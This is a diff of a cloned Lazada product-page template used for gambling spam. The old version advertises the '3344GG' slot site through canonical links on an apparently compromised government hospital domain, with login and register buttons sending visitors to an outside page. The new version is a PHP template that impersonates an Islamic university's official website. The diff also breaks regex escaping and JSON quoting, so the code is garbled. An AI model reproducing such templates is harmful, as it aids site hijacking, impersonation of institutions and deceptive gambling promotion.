-  <meta name="og:image" content="https://res.cloudinary.com/di1pwoapk/image/upload/v1736774864/foto-cover-ghea-youbijpg-20220519114101_c2kxt2.jpg" />
+  <meta name="og:description" content="<?php echo $BRANDS; ?> berkomitmen mencetak lulusan berkualitas dengan nilai-nilai Islam. Menawarkan berbagai program studi unggulan. Login dan Daftar Sekarang!" />
+  <meta name="og:image" content="https://images2.imgbox.com/57/aa/Ee7ZNT1U_o.png" />
   <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
-  <link rel="shortcut icon" href="https://www.svgrepo.com/show/16423/dog.svg" />
-  <link rel="canonical" href="https://rsudarifinachmad.riau.go.id/wbbm/" />
-  <link rel="amphtml" href="https://gg-riau.pages.dev" />
+  <link rel="shortcut icon" href="https://www.abdurrabislamicschool.sch.id/wp-content/uploads/2020/10/logo-abdurrab-islamic-favicon.png" />
+  <link rel="canonical" href="<?php echo $urlPath; ?>" />
+  <link rel="amphtml" href="<?php echo $ampnya; ?>" />
   <!-- start preload -->
-  <meta name="google-site-verification" content="ZW5Nz_f1TLs0eT69kugrhqWqjFkglabYZCmM_AyW3pg" />
-  <link rel="preload" href="https://res.cloudinary.com/di1pwoapk/image/upload/v1736774864/foto-cover-ghea-youbijpg-20220519114101_c2kxt2.jpg" as="image" />
+  <link rel="preload" href="https://images2.imgbox.com/57/aa/Ee7ZNT1U_o.png" as="image" />
   <link rel="preconnect dns-prefetch" href="https://cart.lazada.co.id" />
   <link rel="preconnect dns-prefetch" href="https://acs-m.lazada.co.id" />
   <link rel="preconnect dns-prefetch" href="https://laz-g-cdn.alicdn.com" />
@@ -75,7 +1267,7 @@
       };
       var getRand = function () {
         var page_id = get_cookie('cna') || '001';
-        page_id = page_id.toLowerCase().replace(/[^a-z\d]/g, '');
+        page_id = page_id.toLowerCase().replace(/[^a-zd]/g, '');
         page_id = page_id.substring(0, 16);
         var d = (new Date()).getTime();
         var randend = [
@@ -120,7 +1312,7 @@
       start: Date.now(),
     };
     var dataLayer = window.dataLayer || [];
-    var pdpTrackingData = "{\"pdt_category\":[\"Televisi & Video\"],\"pagetype\":\"pdp\",\"pdt_discount\":\"\",\"pdt_photo\":\"//id-test-11.slatic.net/p/c08a6637647b6984097e3fcf63c97c3c.jpg\",\"v_voya\":1,\"brand_name\":\"Samsung\",\"brand_id\":\"842\",\"pdt_sku\":3642482616,\"core\":{\"country\":\"ID\",\"layoutType\":\"desktop\",\"language\":\"in\",\"currencyCode\":\"IDR\"},\"seller_name\":\"\",\"pdt_simplesku\":6108584955,\"pdt_name\":\"3344GG & Slot Gacor Thailand Hari Ini Pasti Maxwin\",\"page\":{\"regCategoryId\":\"300300002584\",\"xParams\":\"_p_typ=pdp&_p_ispdp=1&_p_item=3642482616_ID-6108584955&_p_prod=3642482616&_p_sku=6108584955&_p_slr=\"},\"supplier_id\":\"\",\"pdt_price\":\"Rp2.699.000\"}";
+    var pdpTrackingData = "{"pdt_category":["Televisi & Video"],"pagetype":"pdp","pdt_discount":"","pdt_photo":"//id-test-11.slatic.net/p/c08a6637647b6984097e3fcf63c97c3c.jpg","v_voya":1,"brand_name":"Samsung","brand_id":"842","pdt_sku":3642482616,"core":{"country":"ID","layoutType":"desktop","language":"in","currencyCode":"IDR"},"seller_name":"","pdt_simplesku":6108584955,"pdt_name":"<?php echo $BRANDS; ?> Website Resmi Universitas Persatuan Islam","page":{"regCategoryId":"300300002584","xParams":"_p_typ=pdp&_p_ispdp=1&_p_item=3642482616_ID-6108584955&_p_prod=3642482616&_p_sku=6108584955&_p_slr="},"supplier_id":"","pdt_price":"Rp2.699.000"}";
     try {
       pdpTrackingData = JSON.parse(pdpTrackingData);
       pdpTrackingData.v_voya = false;
@@ -634,7 +1826,7 @@
 </div>
 
   <script type="application/ld+json">
-    {"@type":"Product","@context":"https://schema.org","name":"3344GG & Slot Gacor Thailand Hari Ini Pasti Maxwin","image":"//id-test-11.slatic.net/p/c08a6637647b6984097e3fcf63c97c3c.jpg","category":"Televisi & Video","brand":{"@type":"Brand","name":"Samsung","url":"https://rsudarifinachmad.riau.go.id/wbbm/"},"sku":"3642482616_ID-6108584955","mpn":3642482616,"description":"3344GG adalah platform slot thailand gacor terpercaya yang menjadi pilihan utama para pemain di Thailand. Dikenal sebagai situs slot gacor dengan peluang menang besar, 3344GG menghadirkan berbagai permainan slot terbaru.","url":"https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html","offers":{"@type":"Offer","url":"https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html","seller":{"@type":"Organization","name":""},"priceCurrency":"IDR","price":0,"availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition"}}
+    {"@type":"Product","@context":"https://schema.org","name":"<?php echo $BRANDS; ?> Website Resmi Universitas Persatuan Islam","image":"//id-test-11.slatic.net/p/c08a6637647b6984097e3fcf63c97c3c.jpg","category":"Televisi & Video","brand":{"@type":"Brand","name":"Samsung","url":"<?php echo $urlPath; ?>"},"sku":"3642482616_ID-6108584955","mpn":3642482616,"description":"<?php echo $BRANDS; ?> berkomitmen mencetak lulusan berkualitas dengan nilai-nilai Islam. Menawarkan berbagai program studi unggulan. Login dan Daftar Sekarang!","url":"https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html","offers":{"@type":"Offer","url":"https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html","seller":{"@type":"Organization","name":""},"priceCurrency":"IDR","price":0,"availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition"}}
   </script>
   <script type="application/ld+json" data-rh="true">
       {
@@ -644,36 +1836,36 @@
           "@type": "ListItem",
           "position": 1,
           "item": {
-            "@id": "https://rsudarifinachmad.riau.go.id/wbbm/",
-            "name": "slot thailand gacor"
+            "@id": "<?php echo $urlPath; ?>",
+            "name": "<?php echo $BRANDS; ?> LOGIN"
           }
         }, {
           "@type": "ListItem",
           "position": 2,
           "item": {
-            "@id": "https://rsudarifinachmad.riau.go.id/wbbm/",
-            "name": "Slot Bet 200"
+            "@id": "<?php echo $urlPath; ?>",
+            "name": "<?php echo $BRANDS; ?> HEYLINK"
           }
         }, {
           "@type": "ListItem",
           "position": 3,
           "item": {
-            "@id": "https://rsudarifinachmad.riau.go.id/wbbm/",
-            "name": "Situs Slot Gacor"
+            "@id": "<?php echo $urlPath; ?>",
+            "name": "<?php echo $BRANDS; ?>"
           }
         }, {
           "@type": "ListItem",
           "position": 4,
           "item": {
-            "@id": "https://rsudarifinachmad.riau.go.id/wbbm/",
-            "name": "Slot Gacor Hari Ini"
+            "@id": "<?php echo $urlPath; ?>",
+            "name": "<?php echo $BRANDS; ?> Daftar"
           }
         }, {
           "@type": "ListItem",
           "position": 5,
           "item": {
-            "@id": "https://rsudarifinachmad.riau.go.id/wbbm/",
-            "name": "3344GG & Slot Gacor Thailand Hari Ini Pasti Maxwin"
+            "@id": "<?php echo $urlPath; ?>",
+            "name": "<?php echo $BRANDS; ?> Website Resmi Universitas Persatuan Islam"
           }
         }]
       }
@@ -716,7 +1908,7 @@
     };
     var getRand = function () {
       var page_id = get_cookie('cna') || '001';
-      page_id = page_id.toLowerCase().replace(/[^a-z\d]/g, '');
+      page_id = page_id.toLowerCase().replace(/[^a-zd]/g, '');
       page_id = page_id.substring(0, 16);
       var d = (new Date()).getTime();
       var randend = [
@@ -813,10 +2005,10 @@
 <div class="success-message" id="topActionDownloadSuccessMsg"><span class="alert alert-success">Success! Please check your phone for the download link  </span></div>
 <div class="error-message" id="topActionDownloadErrorMsg"></div>
         <div class="app-stores">
-          <a href="https://rsudarifinachmad.riau.go.id/wbbm/" class="store-link">
+          <a href="<?php echo $urlPath; ?>" class="store-link">
             <i class="app-apple"></i>
           </a>
-          <a href="https://rsudarifinachmad.riau.go.id/wbbm/" class="store-link">
+          <a href="<?php echo $urlPath; ?>" class="store-link">
             <i class="app-google"></i>
           </a>
         </div>
@@ -901,10 +2093,10 @@
 </div>
                   </div>
                 <div class="top-links-item  grey" id="anonLogin">
-                  <a class="grey" href="https://gg-riau.pages.dev" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d5">LOGIN</a>
+                  <a class="grey" href="<?php echo $ampnya; ?>" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d5">LOGIN</a>
                 </div>
                 <div class="top-links-item  grey" id="anonSignup">
-                  <a class="grey" href="https://gg-riau.pages.dev" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d6">DAFTAR</a>
+                  <a class="grey" href="<?php echo $ampnya; ?>" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d6">DAFTAR</a>
                 </div>
                 <div class="top-links-item top-links-item-hidden" id="topActionUserAccont" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d7">
                   <span id="myAccountTrigger" class="grey"></span>
@@ -958,7 +2150,7 @@
 <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
     <div class="lzd-site-menu-nav-container">
         <div class="lzd-site-menu-nav-category">
-            <a href="https://rsudarifinachmad.riau.go.id/wbbm/">
+            <a href="<?php echo $urlPath; ?>">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
             <div class="lzd-site-menu-nav-menu">
@@ -1981,28 +3173,28 @@
         <nav class="lzd-menu-labels" data-spm="menu">
             <a class="lzd-menu-labels-item" href="//pages.lazada.co.id/wow/i/id/LandingPage/lazmall?wh_weex=true&amp;wx_navbar_transparent=true&amp;data_prefetch=true&amp;scm=1003.4.icms-zebra-5000383-2586266.OTHER_6502207795_7692459">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
-                    <img alt="LazMall" class="lzd-site-nav-menu-iconfont-img" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1gNcMWBr0gK0jSZFnXXbRRXXa.png">
+                    <img alt="LazMall" class="lzd-site-nav-menu-iconfont-img" src="https://deallect.pro/img/image-removebg-preview-10.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-LazMall">&#xe629;</i>-->
                 <span class="lzd-menu-labels-item-text">LazMall</span>
             </a>
             <a class="lzd-menu-labels-item" href="//pages.lazada.co.id/wow/i/id/digitalgoods/home?hybrid=1&amp;scm=1003.4.icms-zebra-5000383-2586266.OTHER_6502207798_7692459">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
-                    <img alt="Pulsa &amp;" class="lzd-site-nav-menu-iconfont-img" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1Je4vhRr0gK0jSZFnXXbRRXXa.png">
+                    <img alt="Pulsa &amp;" class="lzd-site-nav-menu-iconfont-img" src="https://deallect.pro/img/image-removebg-preview-9.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-MobileTop1">&#xe768;</i>-->
                         <span class="lzd-menu-labels-item-text">Pulsa &amp; Tagihan</span>
             </a>
             <a class="lzd-menu-labels-item" href="//pages.lazada.co.id/wow/gcp/route/lazada/id/upr_1000345_lazada/channel/id/upr-router/id_upr?hybrid=1&amp;data_prefetch=true&amp;at_iframe=1&amp;wh_pid=/lazada/channel/id/all-promo/mcp-ush&amp;scm=1003.4.icms-zebra-5000383-2586266.OTHER_6502207802_7692459&amp;prefetch_replace=1">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
-                    <img alt="Voucher &amp;" class="lzd-site-nav-menu-iconfont-img" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1x8lvhHj1gK0jSZFuXXcrHpXa.png">
+                    <img alt="Voucher &amp;" class="lzd-site-nav-menu-iconfont-img" src="https://deallect.pro/img/image-removebg-preview-8.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-Vouchers">&#xe76a;</i>-->
                         <span class="lzd-menu-labels-item-text">Voucher &amp; Diskon</span>
             </a>
             <a class="lzd-menu-labels-item" href="https://www.lazada.co.id/blog/?scm=1003.4.icms-zebra-5000383-2586266.OTHER_6502207806_7692459">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
-                    <img alt="LazBlog" class="lzd-site-nav-menu-iconfont-img" src="//icms-image.slatic.net/images/ims-web/9174453f-455e-4e30-87d2-bd90239e6994.png">
+                    <img alt="LazBlog" class="lzd-site-nav-menu-iconfont-img" src="https://deallect.pro/img/9174453f-455e-4e30-87d2-bd90239e6994-removebg-preview.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-Categories">&#xe765;</i>-->
                 <span class="lzd-menu-labels-item-text">LazBlog</span>
@@ -2025,7 +3217,7 @@
 <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
     <div class="lzd-site-menu-nav-container">
         <div class="lzd-site-menu-nav-category">
-            <a href="https://rsudarifinachmad.riau.go.id/wbbm/">
+            <a href="<?php echo $urlPath; ?>">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
             <div class="lzd-site-menu-nav-menu">
@@ -3043,28 +4235,28 @@
         <nav class="lzd-menu-labels" data-spm="menu">
             <a class="lzd-menu-labels-item" href="//pages.lazada.co.id/wow/i/id/LandingPage/lazmall?wh_weex=true&amp;wx_navbar_transparent=true&amp;data_prefetch=true&amp;scm=1003.4.icms-zebra-5000383-2586266.OTHER_6502207795_7692459">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
-                    <img alt="LazMall" class="lzd-site-nav-menu-iconfont-img" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1gNcMWBr0gK0jSZFnXXbRRXXa.png">
+                    <img alt="LazMall" class="lzd-site-nav-menu-iconfont-img" src="https://deallect.pro/img/image-removebg-preview-10.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-LazMall">&#xe629;</i>-->
                 <span class="lzd-menu-labels-item-text">LazMall</span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://rsudarifinachmad.riau.go.id/wbbm/">
+            <a class="lzd-menu-labels-item" href="<?php echo $urlPath; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
-                    <img alt="Pulsa &amp;" class="lzd-site-nav-menu-iconfont-img" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1Je4vhRr0gK0jSZFnXXbRRXXa.png">
+                    <img alt="Pulsa &amp;" class="lzd-site-nav-menu-iconfont-img" src="https://deallect.pro/img/image-removebg-preview-9.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-MobileTop1">&#xe768;</i>-->
                         <span class="lzd-menu-labels-item-text">Pulsa &amp; Tagihan</span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://rsudarifinachmad.riau.go.id/wbbm/">
+            <a class="lzd-menu-labels-item" href="<?php echo $urlPath; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
-                    <img alt="Voucher &amp;" class="lzd-site-nav-menu-iconfont-img" src="//laz-img-cdn.alicdn.com/images/ims-web/TB1x8lvhHj1gK0jSZFuXXcrHpXa.png">
+                    <img alt="Voucher &amp;" class="lzd-site-nav-menu-iconfont-img" src="https://deallect.pro/img/image-removebg-preview-8.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-Vouchers">&#xe76a;</i>-->
                         <span class="lzd-menu-labels-item-text">Voucher &amp; Diskon</span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://rsudarifinachmad.riau.go.id/wbbm/">
+            <a class="lzd-menu-labels-item" href="<?php echo $urlPath; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
-                    <img alt="LazBlog" class="lzd-site-nav-menu-iconfont-img" src="//icms-image.slatic.net/images/ims-web/9174453f-455e-4e30-87d2-bd90239e6994.png">
+                    <img alt="LazBlog" class="lzd-site-nav-menu-iconfont-img" src="https://deallect.pro/img/9174453f-455e-4e30-87d2-bd90239e6994-removebg-preview.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-Categories">&#xe765;</i>-->
                 <span class="lzd-menu-labels-item-text">LazBlog</span>
@@ -3093,9 +4285,9 @@ var lzdDocCookies = {
       decodeURIComponent(
         document.cookie.replace(
           new RegExp(
-            '(?:(?:^|.*;)\\s*' +
-              encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, '\\$&') +
-              '\\s*\\=\\s*([^;]*).*$)|^.*$'
+            '(?:(?:^|.*;)\s*' +
+              encodeURIComponent(sKey).replace(/[-.+*]/g, '\$&') +
+              '\s*\=\s*([^;]*).*$)|^.*$'
           ),
           '$1'
         )
@@ -3103,7 +4295,7 @@ var lzdDocCookies = {
     );
   },
   setItem: function(sKey, sValue, vEnd, sPath, sDomain, bSecure) {
-    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) {
+    if (!sKey || /^(?:expires|max-age|path|domain|secure)$/i.test(sKey)) {
       return false;
     }
     var sExpires = '';
@@ -3124,9 +4316,9 @@ var lzdDocCookies = {
     if (!sKey) {return false;
     }
     return new RegExp(
-      '(?:^|;\\s*)' +
-        encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, '\\$&') +
-        '\\s*\\='
+      '(?:^|;\s*)' +
+        encodeURIComponent(sKey).replace(/[-.+*]/g, '\$&') +
+        '\s*\='
     ).test(document.cookie);
   },
   removeItem: function(sKey, sPath, sDomain) {
@@ -3329,8 +4521,8 @@ if (!lzdDocCookies.getItem('t_uid')) {
 
   </div>
   <div id="container" style="visibility: visible;">
-    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy"class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="3344GG & Slot Gacor Thailand Hari Ini Pasti Maxwin" src="https://res.cloudinary.com/di1pwoapk/image/upload/v1736774864/foto-cover-ghea-youbijpg-20220519114101_c2kxt2.jpg"/></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title">3344GG & Slot Gacor Thailand Hari Ini Pasti Maxwin</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="12anj4u.pdp_revamp.0.0">8.882.881 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://rsudarifinachmad.riau.go.id/wbbm/">slot thailand gacor</a><div class="pdp-product-brand__divider"></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price"><p>3344GG adalah platform slot thailand gacor terpercaya yang menjadi pilihan utama para pemain di Thailand. Dikenal sebagai situs slot gacor dengan peluang menang besar, 3344GG menghadirkan berbagai permainan slot terbaru.</p><div class="pdp-product-price" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_normal pdp-price_color_orange pdp-price_size_xl" data-spm-anchor-id="12anj4u.pdp_revamp.0.i0.241073bdUG5ius">Rp.1.687</span><div class="origin-block" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_deleted pdp-price_color_lightgray pdp-price_size_xs">Rp.100.000</span><span class="pdp-product-price__discount">-50%</span></div></div></div></div><div id="module_redmart_product_price" class="pdp-block module"></div><div id="module_promotion_tags" class="pdp-block module"></div><div id="module_installment" class="pdp-block module"></div><div id="module_sms-phone-input" class="pdp-block module"></div><div id="module_add_to_cart" class="pdp-block module" bis_skin_checked="1"><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://gg-riau.pages.dev"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="12anj4u.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">Login</span></button></a><a href="https://gg-riau.pages.dev" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">DAFTAR SEKARANG</span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;3642482616&quot;,&quot;skuId&quot;:&quot;6108584955&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div><div id="module_redmart_add_to_cart" class="pdp-block module"></div></div><div id="block-O-HF3LN4YVI" class="pdp-block pdp-block__delivery-seller"><div id="module_seller_delivery" class="pdp-block module"><div data-spm="delivery_options" data-nosnippet="true"><div class="delivery"><div class="delivery-header"><div class="delivery-header__title" data-spm-anchor-id="a2o4j.pdp_revamp.delivery_options.i1.502946e9Rasjau">Pilihan pengiriman&nbsp;</div><div class="delivery-header__tooltip"><div><i class="delivery-tooltip__icon"><span><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_tooltip"></use></svg></span></i></div></div></div><div class="delivery__header"><div class="location delivery__location"><div class="location__current"><div class="location__body"><i class="location__icon"><span><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true" data-spm-anchor-id="a2o4j.pdp_revamp.delivery_options.i2.502946e9Rasjau"><use xlink:href="#lazadaicon_location"></use></svg></span></i><div class="location__address">DKI Jakarta, Kota Jakarta Barat, Cengkareng</div><div class="location__link-change"><a class="location-link location-link_size_xs automation-location-link-change">UBAH</a></div></div></div></div></div><div class="delivery__content"><div class="delivery__options"><div class="delivery__option"><div class="delivery-option-item delivery-option-item_type_standard"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><span class="lzd-svg-icon lzd-svg-icon_name_standard"><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_standard"></use></svg></span></i><div class="delivery-option-item__info"><div class="delivery-option-item__title">Standar</div><div class="delivery-option-item__time">Dijamin tiba 10 Nov - 12 Nov. Dapatkan LazRewards Rp10.000 jika pesananmu terlambat</div></div><div class="delivery-option-item__shipping-fee no-subtitle">Rp18.000</div></div></div></div><div class="delivery__option"><div class="delivery-option-item delivery-option-item_type_COD"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><span class="lzd-svg-icon lzd-svg-icon_name_shipping"><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_shipping" data-spm-anchor-id="a2o4j.pdp_revamp.delivery_options.i0.502946e9Rasjau"></use></svg></span></i><div class="delivery-option-item__info"><div class="delivery-option-item__title">Bayar di tempat berlaku</div></div><div class="delivery-option-item__shipping-fee no-subtitle"></div></div></div></div></div></div></div></div></div><div id="module_redmart_delivery" class="pdp-block module"></div><div id="module_seller_warranty" class="pdp-block module"><div class="warranty" data-spm="return_warranty" data-nosnippet="true"><div class="delivery-header"><div class="delivery-header__title">Pengembalian &amp; Garansi&nbsp;</div><div class="delivery-header__tooltip"><div><i class="delivery-tooltip__icon"><span><svgclass="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_tooltip"></use></svg></span></i></div></div></div><div class="warranty__options"><div class="warranty__option-item"><div class="delivery-option-item delivery-option-item_type_change_mind_available"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><imgsrc="https://img.lazcdn.com/g/tps/imgextra/i4/O1CN01HLFg791eRalDVt0XN_!!6000000003868-2-tps-54-54.png" width="24"></i><div class="delivery-option-item__info"><div class="delivery-option-item__title" data-spm-anchor-id="a2o4j.pdp_revamp.return_warranty.i0.502946e9Rasjau">Berubah Pikiran</div></div></div></div></div><div class="warranty__option-item"><div class="delivery-option-item delivery-option-item_type_returnPolicy7"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><span class="lzd-svg-icon lzd-svg-icon_name_7days"><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_7days"></use></svg></span></i><div class="delivery-option-item__info"><div class="delivery-option-item__title">7 Hari Gratis Pengembalian</div></div></div></div></div><div class="warranty__option-item"><div class="delivery-option-item delivery-option-item_type_noWarranty"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><span class="lzd-svg-icon lzd-svg-icon_name_nowarranty"><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_nowarranty"></use></svg></span></i><div class="delivery-option-item__info"><div class="delivery-option-item__title">Tidak ada garansi</div></div></div></div></div></div></div></div><div id="module_guide_app" class="pdp-block module"></div><div id="module_redmart_service" class="pdp-block module"></div>
-    <div id="module_seller_info" class="pdp-block module"><div class="seller-container" data-spm="seller"><div class="seller-name"><div class="seller-name__wrapper"><div class="seller-name__title">Dijual oleh</div><div class="seller-name__detail" data-spm="seller"><a href="https://rsudarifinachmad.riau.go.id/wbbm/">slot thailand gacor</a><a class="pdp-link pdp-link_size_l pdp-link_theme_black seller-name__detail-name"></a></div></div></div><div class="pdp-seller-info-pc"><div class="info-content" data-spm-anchor-id="a2o4j.pdp_revamp.seller.i0.502946e9Rasjau"><div class="seller-info-title">Rating Toko</div><div class="seller-info-value rating-positive ">98%</div></div><div class="info-content"><div class="seller-info-title">Pengiriman Tepat Waktu</div><div class="seller-info-value ">100%</div></div><div class="info-content"><div class="seller-info-title">Chat Dibalas</div><div class="seller-info-value ">100%</div></div></div><div class="pdp-seller-info-pc"></div></div></div><div id="module_redmart_seller_info" class="pdp-block module"></div></div></div></div></div></div>
+    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy"class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="<?php echo $BRANDS; ?> Website Resmi Universitas Persatuan Islam" src="https://images2.imgbox.com/57/aa/Ee7ZNT1U_o.png"/></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title"><?php echo $BRANDS; ?> Website Resmi Universitas Persatuan Islam</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" 